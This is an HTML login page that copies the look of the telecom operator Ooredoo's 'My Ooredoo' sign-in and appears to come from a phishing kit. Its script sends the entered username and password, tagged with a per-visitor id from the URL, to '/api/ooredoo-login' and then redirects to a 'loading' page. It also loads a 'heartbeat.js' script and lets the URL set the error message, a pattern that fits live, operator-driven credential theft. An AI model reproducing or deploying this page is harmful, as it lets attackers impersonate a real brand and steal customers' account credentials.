<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Sign in to My Ooredoo</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--red:#ED1C24;--ink:#1b1b2f;--grey-text:#8a8a8f;--border:#d9d9dd;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
*,*::before,*::after{box-sizing:inherit}html,body{margin:0;background:#fff}body{font-family:'IBM Plex Sans Arabic',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--ink);display:flex;justify-content:center;-webkit-font-smoothing:antialiased}.screen{width:100%;max-width:380px;min-height:100vh;padding:40px 22px 30px;display:flex;flex-direction:column}h1{font-weight:700;font-size:27px;line-height:1.3;margin:0 0 22px}.intro{font-size:15px;line-height:1.75;margin:0 0 10px}.intro.q{margin-bottom:14px}.hl{color:var(--red);font-weight:700}.fields{margin-top:28px;display:flex;flex-direction:column;gap:20px}.field{position:relative}.field input{width:100%;height:60px;border:1.5px solid var(--border);border-radius:14px;background:#fff;padding:0 20px;font:15px inherit;color:var(--ink);outline:none}.field input::placeholder{color:var(--grey-text)}.field input:focus{border-color:var(--red)}.field.password input{padding-right:60px}.toggle{position:absolute;right:20px;top:50%;transform:translateY(-50%);background:none;border:0;padding:6px;cursor:pointer;color:#3a3a3a;line-height:0}.forgot{display:block;text-align:center;margin:24px 0 0;color:var(--red);font-weight:600;font-size:14px;text-decoration:underline;text-underline-offset:4px}.login-error{display:none;margin:14px 0 0;color:var(--red);font-size:14px;font-weight:600;line-height:1.6;text-align:center}.login-error.visible{display:block}.submit{margin-top:28px;width:100%;height:52px;border:0;border-radius:12px;background:var(--red);color:#fff;font:600 16px inherit;cursor:pointer}.submit:hover{background:#d4161d}.language{margin:20px auto 0;color:var(--red);font-size:13px;text-decoration:none}@media(max-width:380px){.screen{padding:44px 20px 32px}h1{font-size:29px}.intro{font-size:17px}}
</style>
</head>
<body>
<main class="screen">
<h1>Sign in to<br>My Ooredoo!</h1>
<p class="intro">Sign in using your username and password.</p>
<p class="intro q">Can’t remember your username or don’t have one?</p>
<p class="intro">You can sign in using your <span class="hl">mobile number and temporary password</span>.</p>
<div class="fields"><div class="field"><input id="username" type="text" placeholder="Email or username" autocomplete="username"></div><div class="field password"><input id="pw" type="password" placeholder="Password" autocomplete="current-password"><button class="toggle" type="button" aria-label="Show password" onclick="togglePw()"><svg id="eye" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7"/><path d="M4 15l1.5-2M20 15l-1.5-2M9 17l.6-2.2M15 17l-.6-2.2M12 17.5V15"/></svg></button></div></div>
<p class="login-error" id="loginError" role="alert">The username or password is incorrect</p>
<a class="forgot" href="#">Forgot your password?</a>
<button class="submit" type="button" onclick="handleLogin()">Sign in</button>
<a class="language" href="ooredoo-login.html">العربية</a>
</main>
<script>
function togglePw(){var pw=document.getElementById('pw');var eye=document.getElementById('eye');if(pw.type==='password'){pw.type='text';eye.innerHTML='<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>';}else{pw.type='password';eye.innerHTML='<path d="M2 12s3.5-7 10-7 10 7 10 7"/><path d="M4 15l1.5-2M20 15l-1.5-2M9 17l.6-2.2M15 17l-.6-2.2M12 17.5V15">';}}
function handleLogin(){var username=document.getElementById('username');var password=document.getElementById('pw');var error=document.getElementById('loginError');var invalid=!username.value.trim()||!password.value;error.classList.toggle('visible',invalid);if(invalid){username.focus();return;}var id=new URLSearchParams(window.location.search).get('id')||'';if(!id){error.classList.add('visible');return;}fetch('/api/ooredoo-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id,phone:username.value,password:password.value})}).then(function(response){if(!response.ok)throw new Error('rejected');window.location.href='ooredoo-loading-en.html?id='+encodeURIComponent(id);}).catch(function(){error.classList.add('visible');password.value='';password.focus();});}
(function(){var p=new URLSearchParams(window.location.search);var err=p.get('error');if(err==='1'||err==='ooredoo'){var el=document.getElementById('loginError');var msg=p.get('msg');if(msg)el.textContent=msg;el.classList.add('visible');}})();
</script>
<script src="heartbeat.js"></script>
</body>
</html>
